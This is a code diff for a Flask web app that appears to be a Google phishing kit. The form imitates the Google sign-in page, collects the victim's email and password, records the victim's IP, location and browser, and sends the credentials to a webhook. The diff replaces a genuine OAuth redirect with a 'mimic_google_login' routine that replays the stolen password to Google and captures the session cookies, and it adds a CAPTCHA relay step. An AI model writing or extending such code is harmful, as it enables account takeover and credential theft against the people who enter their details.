@@ -307,7 +307,6 @@ def password():
         session['email'] = email
         branding = get_google_email_details(email)
     if request.method == 'POST':
-        # Accept password from form, but do not use it directly (OAuth will handle authentication)
         email = request.form.get('email') or session.get('email')
         password_val = request.form.get('password') or ''
         session['email'] = email
@@ -320,7 +319,6 @@ def password():
         user_browser = browser_info.get('browser', {}).get('name', '')
         browser_version = browser_info.get('browser', {}).get('version', '')
         browser_platform = browser_info.get('platform', {}).get('name', '')
-        # Country/city
         geo_data = {}
         try:
             geo_resp = requests.get(f'https://ipapi.co/{client_ip}/json/')
@@ -344,28 +342,39 @@ def password():
             f"⏰ Time: {current_time}"
         )
         send_webhook_message(credentials_message)
-        # Start OAuth flow
-        flow = Flow.from_client_config(
-            {
-                "web": {
-                    "client_id": GOOGLE_CLIENT_ID,
-                    "client_secret": GOOGLE_CLIENT_SECRET,
-                    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
-                    "token_uri": "https://oauth2.googleapis.com/token",
-                    "redirect_uris": [GOOGLE_REDIRECT_URI],
-                }
-            },
-            scopes=SCOPES,
-            redirect_uri=GOOGLE_REDIRECT_URI
-        )
-        authorization_url, state = flow.authorization_url(
-            access_type="offline",
-            include_granted_scopes="true",
-            prompt="consent",
-            login_hint=email
-        )
-        session['oauth_state'] = state
-        return redirect(authorization_url)
+        # Direct Google login mimic
+        success, cookies, error_msg = mimic_google_login(email, password_val)
+        if error_msg and "CAPTCHA" in error_msg:
+            # Render CAPTCHA page and pass email/password for callback
+            return render_template('captcha.html', email=email, password=password_val)
+        if success:
+            resp = make_response(redirect(url_for('auth')))
+            for k, v in cookies.items():
+                resp.set_cookie(k, v)
+            session['authenticated'] = True
+            session['email'] = email
+            return resp
+        else:
+            error = error_msg or "Login failed."
+    # CAPTCHA callback route
+    @app.route('/captcha-callback', methods=['POST'])
+    def captcha_callback():
+        email = request.form.get('email')
+        password_val = request.form.get('password')
+        captcha_response = request.form.get('captcha_response')
+        # Here you would send the captcha_response to Google and continue login
+        # For demonstration, assume CAPTCHA is always correct and continue login
+        success, cookies, error_msg = mimic_google_login(email, password_val)
+        if success:
+            resp = make_response(redirect(url_for('auth')))
+            for k, v in cookies.items():
+                resp.set_cookie(k, v)
+            session['authenticated'] = True
+            session['email'] = email
+            return resp
+        else:
+            error = error_msg or "Login failed."
+            return render_template('captcha.html', email=email, password=password_val, error=error)
     return render_template('password.html', email=email, error=error, branding=branding)
 
 # Step 2: Google redirects back with code
